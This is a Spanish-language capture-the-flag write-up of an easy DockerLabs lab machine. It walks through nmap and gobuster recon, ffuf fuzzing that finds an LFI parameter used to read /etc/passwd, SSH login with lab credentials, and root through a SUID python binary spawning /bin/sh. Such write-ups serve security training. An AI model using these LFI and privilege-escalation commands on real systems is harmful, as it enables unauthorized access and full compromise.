Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #dockerlabs #lfi #suid

![](../assets/Pasted image 20251109193730.png)
#### Reconocimiento

Comienzo tirando un ping para comprobar conectividad.
```bash
> ping -c 1 172.17.0.2
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.827/0.827/0.827/0.000 ms
```

Realizo un escaneo con nmap para ver que puertos están abiertos
```bash
> sudo nmap -p- --open -Pn -n -sS --min-rate 5000 172.17.0.2
------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: B6:F0:3B:69:14:E0 (Unknown)

```
- Puerto 80 HTTP y 22 SSH están abiertos

Ahora procedo a realizar un segundo escaneo para ver mas informacion sobre las versiones y servicios que están corriendo.
```bash
> nmap -p 22,80 -sCV -Pn -n -sS --min-rate 5000 172.17.0.2 -oN target.txt
--------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e1:b8:ce:5c:65:5a:75:9e:ed:30:7a:2b:b2:25:47:6b (RSA)
|   256 a3:78:9f:44:57:0e:15:4f:15:93:59:d0:04:89:a9:f4 (ECDSA)
|_  256 5a:7a:89:3c:ed:da:4a:b4:a0:63:d3:ba:04:39:c3:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: B6:F0:3B:69:14:E0 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Puerto 22 SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 80 HTTP:  Apache httpd 2.4.41 ((Ubuntu))


#### Enumeración

**Puerto 80 HTTP**
- Al parecer es la pagina default de apache2
![](../assets/Pasted image 20251109144335.png)


Procedí a hacer fuzzing para encontrar posibles recursos ocultos:
```bash
> gobuster dir -w raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,py,js,phar,php4
----------------------------------------------------------------------------------------------------------------------------------------------------===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 110]
/server-status        (Status: 403) [Size: 275]
```

Encuentro un archivo llamado _index.php_ que contiene el siguiente contenido:
![](../assets/Pasted image 20251109144427.png)

Como es un servicio apache2, seguramente ya estemos en la ruta /var/www/html entonces podemos ir a buscar el archivo directamente:
![](../assets/Pasted image 20251109150235.png)


#### Explotación

Al parecer la web es capaz de volcar archivo por lo cual me hace pensar que es vulnerable a un LFI, podemos tratar de fuzzear sobr el archivo _index.php_ para descubrir algún parametro que nos permita volcar el /etc/passwd
```bash
ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
-----------------------------------------------------------------------------------------------
page   [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 2ms]
```
- Descubrimos el parametro _page_

Ahora volcamos el /etc/passwd
![](../assets/Pasted image 20251109151030.png)
- Vemos que existen 2 usuarios uno llamado _pinguino_ y el otro _mario_

Nos conectamos por ssh con las credenciales
- pinguino:balu
```bash
> ssh pinguino@172.17.0.2
---------------------------
pinguino@dockerlabs:~$ whoami
pinguino
pinguino@dockerlabs:~$ id
uid=1000(pinguino) gid=1000(pinguino) groups=1000(pinguino)
pinguino@dockerlabs:~$ 
```

#### Escalada de Privilegios

Con el usuario _pinguino_ nos encontramos un archivo llamado nota_mario.txt que al parecer revela la contraseña del usuario mario
```bash
> pinguino@dockerlabs:~$ ls
nota_mario.txt
pinguino@dockerlabs:~$ cat nota_mario.txt
La contraseña de mario es: invitaacachopo
```
- invitaacachopo

Por lo cual procedemos a migrar al usuario mario
```bash
> pinguino@dockerlabs:~$ su mario
Password: 
mario@dockerlabs:/home/pinguino$ whoami
mario
```

Ahora lo que hicimos fue tratar de encontrar binarios con permisos SUID
```bash
> mario@dockerlabs:/home$ find / -perm -4000 2>/dev/null
----------------------------------------------------------
/usr/bin/python3.8
```
- Encontramos el binario python que pertenece al usuario root.

Por lo cual ahora, sabiendo que el binario python tiene permisos SUID procedemos a explotarlo con ayuda de GTFObins
```bash
> mario@dockerlabs:/home$ /usr/bin/python3.8 -c 'import os; os.system("/bin/sh")'
# whoami
root
# id
uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
```
- uid=1001(mario) ← Identidad real: Soy mario euid=0(root) ← Privilegios efectivos: Actúas como root


***PWNED**